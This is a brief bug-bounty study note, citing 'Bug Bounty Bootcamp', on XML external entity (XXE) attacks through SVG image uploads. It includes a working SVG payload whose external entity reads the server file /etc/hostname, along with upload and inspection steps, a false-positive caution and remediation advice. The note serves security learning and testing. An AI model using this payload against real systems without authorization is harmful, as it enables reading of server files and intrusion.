# XXE via SVG Upload

- SVG is XML-based, so image-upload/file-processing features can expose an XML parser to XXE payloads.
- Insert a DTD into the SVG and reference the entity in visible SVG text.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "file:///etc/hostname">
]>
<svg width="500" height="500">
  <text font-size="16" x="0" y="16">&test;</text>
</svg>
```
- Save as `.svg`, upload through the normal feature, and inspect the processed result/raw response.
- File-upload parsers may have different XML protections than normal API endpoints.
- False-positive trap: many image pipelines sanitize, rasterize, or disable DTD processing before rendering.
- Remediation: disable DTD/external entities in image/XML processors and sanitize uploaded SVG content.
## Source: Bug Bounty Bootcamp, Ch. 15
